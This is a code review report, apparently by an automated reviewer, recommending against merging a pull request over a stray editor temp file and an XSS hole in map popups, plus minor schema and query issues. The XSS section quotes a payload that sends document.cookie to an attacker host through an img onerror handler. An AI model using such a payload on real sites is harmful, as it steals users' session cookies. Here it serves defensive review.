# Quality Report — Issue #9 Review

**Reviewed by:** The Squirrel
**PR:** #19 (`issue-9-final-tests` → `main`)
**Date:** 2026-03-01

---

## Status: 🔴 BAD NUT — DO NOT MERGE

---

## Executive Summary

The feature work for Issue #9 is functionally solid and well-tested (69/69 tests passing). The architecture follows established patterns cleanly. However, the PR introduces an **accidental binary temp file** that must never reach `main`, and the underlying codebase (already in `main`) contains an **unmitigated XSS vulnerability** in the Map popup that was missed during prior reviews. These two issues block merge.

---

## Critical Issues (Showstoppers)

### 1. 🚨 Accidental Binary Temp File in PR (`..geminiigore.un~`)

The PR includes a binary file named `..geminiigore.un~` — a leftover undo/backup file from a text editor (likely Vim or Emacs). This was accidentally committed in `c355c1c`.

**Impact:** Pollutes the repository history permanently. Looks unprofessional. Binary blobs of unknown origin in a codebase are a liability.

**Fix:** Remove this file before merging. The `.geminiignore` file that was also added is acceptable (it's intentional), but the tilde file must go.

---

### 2. 🔒 XSS Vulnerability in `Map.tsx:230-231`

User-supplied content is interpolated directly into raw HTML without sanitization:

```typescript
// src/components/Map.tsx:230-234
<h3 class="font-bold text-zinc-900">${report.title}</h3>
<p class="text-sm text-zinc-600 mt-1">${report.description || ''}</p>
...
<span ...>${report.category || 'Bez kategorie'}</span>
```

An authenticated user can create a report with a title of `<img src=x onerror=fetch('https://attacker.com/?c='+document.cookie)>` and steal session cookies from every user who opens the map. Zod validates *length* of these fields, not *content*.

This vulnerability was introduced in a prior commit and exists in `main` already. The PR should not be merged on top of a codebase with an open XSS sink. This must be fixed (escape the strings before interpolation, or use `maplibregl.Popup.setText()` / create DOM nodes manually).

---

## Code Smells & Improvements

### Minor — Shared `error` State Across All Operations (`TopicsClient.tsx:47`)

A single `error` state is shared across voting, commenting, and topic creation. A vote error will be overwritten by a concurrent comment error, or vice versa. Fine for MVP but creates confusing UX as the app grows.

### Minor — Double Supabase Query for Reports in Dashboard (`dashboard/page.tsx:15-28`)

Reports are fetched twice: once for all-time stats (`allReportsData`) and once for the latest 5 (`latestReports`). The second query is redundant — the latest 5 can be derived from the first result. At scale this is wasteful.

### Minor — `description` Schema Inconsistency (`topics/actions.ts:9`)

```typescript
description: z.string().min(10, ...).max(1000).optional(),
```

`optional()` means an empty string `""` submitted by the form will fail `min(10)`, but a missing value (`null`) passes. Since the textarea submits `""` when empty, users who type nothing get a validation error about minimum length, even though the label says "(volitelně)" — optional. Should use `.or(z.literal(''))` or `z.string().min(10).optional().or(z.literal(''))` to handle the empty-string case gracefully.

### Trivial — `select('*')` in Dashboard Latest Reports (`dashboard/page.tsx:22`)

Over-fetches all columns when only `id, title, rating, category, status` are needed for the UI.

---

## Test Coverage Analysis

**Result: Strong.** 69 tests, 13 test files, 100% passing.

- `TopicsClient.test.tsx` — Excellent coverage: optimistic voting toggle, vote switch (up→down), comment submission + form reset, error state display, unauthenticated redirect.
- `TopicForm.test.tsx` (new in this PR) — Covers happy path, error display, disabled state, close button. Appropriate for the component's scope.
- `Map.test.tsx` — Tests heatmap toggle and status badge injection.
- `actions.test.ts` — Covers toggle voting logic (insert/delete/update), `addComment` validation, auth guards.

**One gap:** No test covers the XSS escape path in Map popups (because there is no escape — this gap reveals the vulnerability).

---

## Verdict

Fix these two issues, then it's shippable:

1. **Remove `..geminiigore.un~`** from the PR branch before merging.
2. **Sanitize user content** before injecting into `setHTML()` in `Map.tsx`.

Everything else — architecture, optimistic UI, voting logic, server actions, component decomposition — is clean and production-ready.
